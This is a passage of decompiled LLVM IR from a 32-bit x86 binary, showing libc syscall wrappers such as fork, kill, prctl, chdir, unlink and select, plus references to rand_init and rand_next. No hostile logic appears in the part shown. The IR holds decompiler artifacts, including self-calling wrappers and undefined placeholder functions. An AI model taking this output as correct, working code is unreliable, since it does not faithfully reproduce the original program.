  uselistorder i32 %v2_80498bc, { 5, 6, 0, 3, 4, 1, 2 }
  uselistorder i32 %v1_804939b, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8049388, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8049343, { 1, 0 }
  uselistorder i32 %v0_804930a, { 1, 0, 2 }
  uselistorder i32 %v2_80492df, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_80492d6, { 1, 0 }
  uselistorder i32 %v2_80492bb, { 1, 0, 2 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 9, 10, 0, 1, 8, 3, 2, 4, 6, 5, 7, 11 }
  uselistorder i32* %eax.global-to-local, { 56, 57, 2, 0, 1, 83, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 14, 15, 82, 81, 18, 19, 20, 21, 80, 79, 22, 23, 24, 27, 28, 29, 25, 26, 30, 31, 32, 33, 34, 35, 36, 37, 78, 77, 38, 39, 55, 40, 41, 44, 42, 43, 45, 46, 49, 47, 48, 50, 51, 52, 53, 54, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 ()* @rand_next, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_init, { 2, 1, 0 }
  uselistorder i8** %argv, { 1, 0 }
  uselistorder label %dec_label_pc_804989b, { 1, 0 }
  uselistorder label %dec_label_pc_8049851, { 1, 0 }
  uselistorder label %dec_label_pc_80497be, { 1, 0 }
  uselistorder label %dec_label_pc_8049769, { 1, 0 }
  uselistorder label %dec_label_pc_8049758, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496eb, { 1, 0 }
  uselistorder label %dec_label_pc_8049683, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804967a, { 1, 0 }
  uselistorder label %dec_label_pc_80495d5, { 1, 0 }
  uselistorder label %dec_label_pc_8049567, { 1, 0 }
  uselistorder label %dec_label_pc_8049545, { 1, 0 }
  uselistorder label %dec_label_pc_804948e, { 1, 0 }
  uselistorder label %dec_label_pc_8049464, { 1, 0 }
  uselistorder label %dec_label_pc_8049409, { 1, 0 }
  uselistorder label %dec_label_pc_80493e8, { 2, 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80498ec = load i32, i32* @edi, align 4
  %v0_80498ed = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8049901 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804990b = icmp ugt i32 %v1_8049901, 2
  br i1 %v6_804990b, label %dec_label_pc_804991b, label %dec_label_pc_804990d

dec_label_pc_804990d:                             ; preds = %entry
  %v4_8049911 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8049901)
  br label %dec_label_pc_804993d

dec_label_pc_804991b:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8049923 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8049923, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8049923, -4095
  br i1 %tmp17, label %dec_label_pc_804993b, label %dec_label_pc_804992f

dec_label_pc_804992f:                             ; preds = %dec_label_pc_804991b
  %v1_804992f = call i32 @__errno_location(i32 %v0_80498ed)
  %v0_8049934 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049934 = sub i32 0, %v0_8049934
  %v2_8049936 = inttoptr i32 %v1_804992f to i32*
  store i32 %v1_8049934, i32* %v2_8049936, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804993b

dec_label_pc_804993b:                             ; preds = %dec_label_pc_804991b, %dec_label_pc_804992f
  %v0_804993b = phi i32 [ %v2_8049923, %dec_label_pc_804991b ], [ -1, %dec_label_pc_804992f ]
  br label %dec_label_pc_804993d

dec_label_pc_804993d:                             ; preds = %dec_label_pc_804990d, %dec_label_pc_804993b
  %v0_8049942 = phi i32 [ %v4_8049911, %dec_label_pc_804990d ], [ %v0_804993b, %dec_label_pc_804993b ]
  store i32 %v0_80498ed, i32* @ebx, align 4
  store i32 %v0_80498ec, i32* @edi, align 4
  ret i32 %v0_8049942

; uselistorder directives
  uselistorder i32 %v2_8049923, { 1, 0, 2 }
  uselistorder i32 %v0_80498ed, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804993d, { 1, 0 }
  uselistorder label %dec_label_pc_804993b, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049944 = load i32, i32* @edi, align 4
  store i32 %v0_8049944, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804995c = load i32, i32* @ebx, align 4
  %v1_8049964 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8049964, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_8049964, -4095
  br i1 %tmp11, label %dec_label_pc_804997c, label %dec_label_pc_8049970

dec_label_pc_8049970:                             ; preds = %entry
  %v1_8049970 = call i32 @__errno_location(i32 %v0_804995c)
  %v0_8049975 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049975 = sub i32 0, %v0_8049975
  %v2_8049977 = inttoptr i32 %v1_8049970 to i32*
  store i32 %v1_8049975, i32* %v2_8049977, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804997c

dec_label_pc_804997c:                             ; preds = %entry, %dec_label_pc_8049970
  %v0_804997c = phi i32 [ %v1_8049964, %entry ], [ -1, %dec_label_pc_8049970 ]
  %v2_8049981 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049981, i32* %edi.global-to-local, align 4
  ret i32 %v0_804997c

; uselistorder directives
  uselistorder i32 %v1_8049964, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804997c, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80499ac = load i32, i32* @edi, align 4
  store i32 %v0_80499ac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80499b4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80499bc = call i32 @chdir(i32 %v0_80499b4)
  store i32 %v0_80499b4, i32* @ebx, align 4
  store i32 %v1_80499bc, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_80499bc, -4095
  br i1 %tmp8, label %dec_label_pc_80499d4, label %dec_label_pc_80499c8

dec_label_pc_80499c8:                             ; preds = %entry
  %v1_80499c8 = call i32 @__errno_location(i32 %v0_80499b4)
  %v0_80499cd = load i32, i32* %edi.global-to-local, align 4
  %v1_80499cd = sub i32 0, %v0_80499cd
  %v2_80499cf = inttoptr i32 %v1_80499c8 to i32*
  store i32 %v1_80499cd, i32* %v2_80499cf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %entry, %dec_label_pc_80499c8
  %v0_80499d4 = phi i32 [ %v1_80499bc, %entry ], [ -1, %dec_label_pc_80499c8 ]
  %v2_80499d6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80499d6, i32* @edx, align 4
  %v2_80499d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80499d8, i32* @edi, align 4
  ret i32 %v0_80499d4

; uselistorder directives
  uselistorder i32 %v1_80499bc, { 1, 0, 2 }
  uselistorder i32 %v0_80499b4, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80499dc = load i32, i32* @edi, align 4
  store i32 %v0_80499dc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80499e4 = load i32, i32* @ebx, align 4
  %v1_80499ec = call i32 @close(i32 %arg1)
  store i32 %v0_80499e4, i32* @ebx, align 4
  store i32 %v1_80499ec, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_80499ec, -4095
  br i1 %tmp8, label %dec_label_pc_8049a04, label %dec_label_pc_80499f8

dec_label_pc_80499f8:                             ; preds = %entry
  %v1_80499f8 = call i32 @__errno_location(i32 %v0_80499e4)
  %v0_80499fd = load i32, i32* %edi.global-to-local, align 4
  %v1_80499fd = sub i32 0, %v0_80499fd
  %v2_80499ff = inttoptr i32 %v1_80499f8 to i32*
  store i32 %v1_80499fd, i32* %v2_80499ff, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049a04

dec_label_pc_8049a04:                             ; preds = %entry, %dec_label_pc_80499f8
  %v0_8049a04 = phi i32 [ %v1_80499ec, %entry ], [ -1, %dec_label_pc_80499f8 ]
  %v2_8049a08 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a08, i32* @edi, align 4
  ret i32 %v0_8049a04

; uselistorder directives
  uselistorder i32 %v1_80499ec, { 1, 0, 2 }
  uselistorder i32 %v0_80499e4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049a04, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049a0c = load i32, i32* @ebx, align 4
  store i32 %v0_8049a0c, i32* %stack_var_-4, align 4
  %v1_8049a15 = call i32 @fork(i32 %v0_8049a0c)
  store i32 %v1_8049a15, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8049a15, -4095
  br i1 %tmp6, label %dec_label_pc_8049a2c, label %dec_label_pc_8049a20

dec_label_pc_8049a20:                             ; preds = %entry
  %v0_8049a20 = load i32, i32* %stack_var_-4, align 4
  %v1_8049a20 = call i32 @__errno_location(i32 %v0_8049a20)
  %v0_8049a25 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a25 = sub i32 0, %v0_8049a25
  %v2_8049a27 = inttoptr i32 %v1_8049a20 to i32*
  store i32 %v1_8049a25, i32* %v2_8049a27, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049a2c

dec_label_pc_8049a2c:                             ; preds = %entry, %dec_label_pc_8049a20
  %v0_8049a2c = phi i32 [ %v1_8049a15, %entry ], [ -1, %dec_label_pc_8049a20 ]
  %v2_8049a2e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049a2e, i32* @edx, align 4
  %v2_8049a30 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a30, i32* @ebx, align 4
  ret i32 %v0_8049a2c

; uselistorder directives
  uselistorder i32 %v1_8049a15, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a2c, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049a34 = load i32, i32* @ebx, align 4
  store i32 %v0_8049a34, i32* %stack_var_-4, align 4
  %v1_8049a3d = call i32 @getpid(i32 %v0_8049a34)
  store i32 %v1_8049a3d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8049a3d, -4095
  br i1 %tmp6, label %dec_label_pc_8049a54, label %dec_label_pc_8049a48

dec_label_pc_8049a48:                             ; preds = %entry
  %v0_8049a48 = load i32, i32* %stack_var_-4, align 4
  %v1_8049a48 = call i32 @__errno_location(i32 %v0_8049a48)
  %v0_8049a4d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a4d = sub i32 0, %v0_8049a4d
  %v2_8049a4f = inttoptr i32 %v1_8049a48 to i32*
  store i32 %v1_8049a4d, i32* %v2_8049a4f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049a54

dec_label_pc_8049a54:                             ; preds = %entry, %dec_label_pc_8049a48
  %v0_8049a54 = phi i32 [ %v1_8049a3d, %entry ], [ -1, %dec_label_pc_8049a48 ]
  %v2_8049a58 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a58, i32* @ebx, align 4
  ret i32 %v0_8049a54

; uselistorder directives
  uselistorder i32 %v1_8049a3d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a54, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049a5c = load i32, i32* @ebx, align 4
  store i32 %v0_8049a5c, i32* %stack_var_-4, align 4
  %v1_8049a65 = call i32 @getppid(i32 %v0_8049a5c)
  store i32 %v1_8049a65, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8049a65, -4095
  br i1 %tmp6, label %dec_label_pc_8049a7c, label %dec_label_pc_8049a70

dec_label_pc_8049a70:                             ; preds = %entry
  %v0_8049a70 = load i32, i32* %stack_var_-4, align 4
  %v1_8049a70 = call i32 @__errno_location(i32 %v0_8049a70)
  %v0_8049a75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049a75 = sub i32 0, %v0_8049a75
  %v2_8049a77 = inttoptr i32 %v1_8049a70 to i32*
  store i32 %v1_8049a75, i32* %v2_8049a77, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049a7c

dec_label_pc_8049a7c:                             ; preds = %entry, %dec_label_pc_8049a70
  %v0_8049a7c = phi i32 [ %v1_8049a65, %entry ], [ -1, %dec_label_pc_8049a70 ]
  %v2_8049a80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049a80, i32* @ebx, align 4
  ret i32 %v0_8049a7c

; uselistorder directives
  uselistorder i32 %v1_8049a65, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_8049a7c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049a84 = load i32, i32* @ebx, align 4
  store i32 %v0_8049a84, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8049a97 = call i32 @kill(i32 %v0_8049a84, i32 %tmp4)
  store i32 %v2_8049a97, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8049a97, -4095
  br i1 %tmp8, label %dec_label_pc_8049ab0, label %dec_label_pc_8049aa4

dec_label_pc_8049aa4:                             ; preds = %entry
  %v0_8049aa4 = load i32, i32* %stack_var_-4, align 4
  %v1_8049aa4 = call i32 @__errno_location(i32 %v0_8049aa4)
  %v0_8049aa9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049aa9 = sub i32 0, %v0_8049aa9
  %v2_8049aab = inttoptr i32 %v1_8049aa4 to i32*
  store i32 %v1_8049aa9, i32* %v2_8049aab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049ab0

dec_label_pc_8049ab0:                             ; preds = %entry, %dec_label_pc_8049aa4
  %v0_8049ab0 = phi i32 [ %v2_8049a97, %entry ], [ -1, %dec_label_pc_8049aa4 ]
  %v2_8049ab2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049ab2, i32* @edx, align 4
  %v2_8049ab4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049ab4, i32* @ebx, align 4
  ret i32 %v0_8049ab0

; uselistorder directives
  uselistorder i32 %v2_8049a97, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049ab0, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049ab8 = load i32, i32* @edi, align 4
  %v0_8049ab9 = load i32, i32* @esi, align 4
  store i32 %v0_8049ab9, i32* %stack_var_-8, align 4
  %v0_8049ad1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8049ad9 = call i32 @prctl(i32 %v0_8049ad1, i32 %v0_8049ab9)
  store i32 %v0_8049ad1, i32* @ebx, align 4
  store i32 %v3_8049ad9, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_8049ad9, -4095
  br i1 %tmp11, label %dec_label_pc_8049af1, label %dec_label_pc_8049ae5

dec_label_pc_8049ae5:                             ; preds = %entry
  %v1_8049ae5 = call i32 @__errno_location(i32 %v0_8049ad1)
  %v0_8049aea = load i32, i32* %esi.global-to-local, align 4
  %v1_8049aea = sub i32 0, %v0_8049aea
  %v2_8049aec = inttoptr i32 %v1_8049ae5 to i32*
  store i32 %v1_8049aea, i32* %v2_8049aec, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049af1

dec_label_pc_8049af1:                             ; preds = %entry, %dec_label_pc_8049ae5
  %v0_8049af1 = phi i32 [ %v3_8049ad9, %entry ], [ -1, %dec_label_pc_8049ae5 ]
  %v2_8049af4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049af4, i32* @esi, align 4
  store i32 %v0_8049ab8, i32* @edi, align 4
  ret i32 %v0_8049af1

; uselistorder directives
  uselistorder i32 %v3_8049ad9, { 1, 0, 2 }
  uselistorder i32 %v0_8049ad1, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_8049af1, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049af9 = load i32, i32* @esi, align 4
  store i32 %v0_8049af9, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8049b11 = load i32, i32* @ebx, align 4
  %v1_8049b19 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8049b11, i32* @ebx, align 4
  store i32 %v1_8049b19, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_8049b19, -4095
  br i1 %tmp11, label %dec_label_pc_8049b31, label %dec_label_pc_8049b25

dec_label_pc_8049b25:                             ; preds = %entry
  %v1_8049b25 = call i32 @__errno_location(i32 %v0_8049b11)
  %v0_8049b2a = load i32, i32* %esi.global-to-local, align 4
  %v1_8049b2a = sub i32 0, %v0_8049b2a
  %v2_8049b2c = inttoptr i32 %v1_8049b25 to i32*
  store i32 %v1_8049b2a, i32* %v2_8049b2c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049b31

dec_label_pc_8049b31:                             ; preds = %entry, %dec_label_pc_8049b25
  %v0_8049b31 = phi i32 [ %v1_8049b19, %entry ], [ -1, %dec_label_pc_8049b25 ]
  %v2_8049b34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049b34, i32* @esi, align 4
  ret i32 %v0_8049b31

; uselistorder directives
  uselistorder i32 %v1_8049b19, { 1, 0, 2 }
  uselistorder i32 %v0_8049b11, { 1, 0 }
  uselistorder label %dec_label_pc_8049b31, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b38 = load i32, i32* @edi, align 4
  store i32 %v0_8049b38, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8049b40 = load i32, i32* @ebx, align 4
  %v2_8049b48 = call i32 @time(i32* %arg1)
  store i32 %v0_8049b40, i32* @ebx, align 4
  store i32 %v2_8049b48, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8049b48, -4095
  br i1 %tmp9, label %dec_label_pc_8049b60, label %dec_label_pc_8049b54

dec_label_pc_8049b54:                             ; preds = %entry
  %v1_8049b54 = call i32 @__errno_location(i32 %v0_8049b40)
  %v0_8049b59 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b59 = sub i32 0, %v0_8049b59
  %v2_8049b5b = inttoptr i32 %v1_8049b54 to i32*
  store i32 %v1_8049b59, i32* %v2_8049b5b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b60

dec_label_pc_8049b60:                             ; preds = %entry, %dec_label_pc_8049b54
  %v0_8049b60 = phi i32 [ %v2_8049b48, %entry ], [ -1, %dec_label_pc_8049b54 ]
  %v2_8049b62 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049b62, i32* @edx, align 4
  %v2_8049b64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b64, i32* @edi, align 4
  ret i32 %v0_8049b60

; uselistorder directives
  uselistorder i32 %v2_8049b48, { 1, 0, 2 }
  uselistorder i32 %v0_8049b40, { 1, 0 }
  uselistorder label %dec_label_pc_8049b60, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b68 = load i32, i32* @edi, align 4
  store i32 %v0_8049b68, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8049b70 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049b78 = call i32 @unlink(i32 %v0_8049b70)
  store i32 %v0_8049b70, i32* @ebx, align 4
  store i32 %v1_8049b78, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8049b78, -4095
  br i1 %tmp8, label %dec_label_pc_8049b90, label %dec_label_pc_8049b84

dec_label_pc_8049b84:                             ; preds = %entry
  %v1_8049b84 = call i32 @__errno_location(i32 %v0_8049b70)
  %v0_8049b89 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b89 = sub i32 0, %v0_8049b89
  %v2_8049b8b = inttoptr i32 %v1_8049b84 to i32*
  store i32 %v1_8049b89, i32* %v2_8049b8b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b90

dec_label_pc_8049b90:                             ; preds = %entry, %dec_label_pc_8049b84
  %v0_8049b90 = phi i32 [ %v1_8049b78, %entry ], [ -1, %dec_label_pc_8049b84 ]
  %v2_8049b94 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b94, i32* @edi, align 4
  ret i32 %v0_8049b90

; uselistorder directives
  uselistorder i32 %v1_8049b78, { 1, 0, 2 }
  uselistorder i32 %v0_8049b70, { 1, 0, 2 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b90, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8049ba9 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_8049ba9
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049bb4 = load i32, i32* @edi, align 4
  store i32 %v0_8049bb4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049bc4 = load i32, i32* @ebx, align 4
  %v4_8049bcc = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8049bc4, i32* @ebx, align 4
  store i32 %v4_8049bcc, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8049bcc, -4095
  br i1 %tmp11, label %dec_label_pc_8049be4, label %dec_label_pc_8049bd8

dec_label_pc_8049bd8:                             ; preds = %entry
  %v1_8049bd8 = call i32 @__errno_location(i32 %v0_8049bc4)
  %v0_8049bdd = load i32, i32* %edi.global-to-local, align 4
  %v1_8049bdd = sub i32 0, %v0_8049bdd
  %v2_8049bdf = inttoptr i32 %v1_8049bd8 to i32*
  store i32 %v1_8049bdd, i32* %v2_8049bdf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049be4

dec_label_pc_8049be4:                             ; preds = %entry, %dec_label_pc_8049bd8
  %v0_8049be4 = phi i32 [ %v4_8049bcc, %entry ], [ -1, %dec_label_pc_8049bd8 ]
  %v2_8049be6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049be6, i32* @edx, align 4
  %v2_8049be8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049be8, i32* @edi, align 4
  ret i32 %v0_8049be4

; uselistorder directives
  uselistorder i32 %v4_8049bcc, { 1, 0, 2 }
  uselistorder i32 %v0_8049bc4, { 1, 0 }
  uselistorder label %dec_label_pc_8049be4, { 1, 0 }
}

define i32 @__GI_toupper() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp, i32* @edx, align 4
  %v1_8049bf0 = add i32 %tmp, 128
  %v6_8049bfb = icmp ugt i32 %v1_8049bf0, 383
  br i1 %v6_8049bfb, label %dec_label_pc_8049c06, label %dec_label_pc_8049bfd

dec_label_pc_8049bfd:                             ; preds = %entry
  %v0_8049bfd = load i32, i32* bitcast (i32** @global_var_8052040.27 to i32*), align 64
  %v2_8049c02 = mul i32 %tmp, 2
  %v3_8049c02 = add i32 %v0_8049bfd, %v2_8049c02
  %v4_8049c02 = inttoptr i32 %v3_8049c02 to i16*
  %v5_8049c02 = load i16, i16* %v4_8049c02, align 2
  %v6_8049c02 = sext i16 %v5_8049c02 to i32
  store i32 %v6_8049c02, i32* @edx, align 4
  br label %dec_label_pc_8049c06

dec_label_pc_8049c06:                             ; preds = %entry, %dec_label_pc_8049bfd
  %v0_8049c06 = phi i32 [ %tmp, %entry ], [ %v6_8049c02, %dec_label_pc_8049bfd ]
  ret i32 %v0_8049c06

; uselistorder directives
  uselistorder label %dec_label_pc_8049c06, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8052520.28 to i32)
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i64 @__decompiler_undefined_function_4()
  %stack_var_-16 = alloca i32, align 4
  %v2_8049c17 = ptrtoint i32* %stack_var_-16 to i32
  %v1_8049c1c = call i32 @times(i32 %v2_8049c17)
  %v4_8049c21 = trunc i64 %tmp to i32
  %v4_8049c25 = load i32, i32* %stack_var_-16, align 4
  %v5_8049c25 = add i32 %v4_8049c25, %v4_8049c21
  %v3_8049c2c = mul i32 %v5_8049c25, 10000
  %v1_8049c32 = and i32 %v3_8049c2c, 2147483632
  ret i32 %v1_8049c32
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8049c38 = load i32, i32* @edi, align 4
  %v4_8049c41 = ptrtoint i8* %arg1 to i32
  %v5_8049c45 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8049c45 = ptrtoint i8* %v5_8049c45 to i32
  store i32 %v6_8049c45, i32* @ecx, align 4
  store i32 %v0_8049c38, i32* @edi, align 4
  ret i32 %v4_8049c41

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8049c51 = ptrtoint i8* %arg1 to i32
  %v2_8049c59 = mul i32 %arg2, 256
  %v3_8049c59 = and i32 %v2_8049c59, 65280
  %v4_8049c59 = and i32 %arg2, -65281
  %v5_8049c59 = or i32 %v3_8049c59, %v4_8049c59
  %v8_8049c5b.pre = load i1, i1* @df, align 1
